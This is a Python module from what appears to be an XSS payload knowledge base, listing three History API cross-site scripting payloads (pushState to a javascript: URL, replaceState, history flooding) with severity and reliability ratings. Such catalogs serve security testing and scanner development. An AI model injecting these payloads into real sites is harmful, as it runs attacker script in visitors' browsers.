#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

History API XSS Payloads
"""

from ..models import PayloadEntry


HISTORY_PAYLOADS = {
    "history_1": PayloadEntry(
        payload="<script>history.pushState({},'','javascript:alert(1)')</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=5.0,
        description="History state manipulation",
        tags=["history", "pushState"],
        reliability="medium",
    ),
    "history_2": PayloadEntry(
        payload="<script>history.replaceState({},'','?xss=1')</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=4.0,
        description="URL manipulation",
        tags=["history", "replaceState"],
        reliability="high",
    ),
    "history_3": PayloadEntry(
        payload="<script>for(let i=0;i<100;i++)history.pushState({},'','/page'+i)</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=4.0,
        description="History pollution",
        tags=["history", "pollution"],
        reliability="high",
    ),
}

HISTORY_PAYLOADS_TOTAL = len(HISTORY_PAYLOADS)
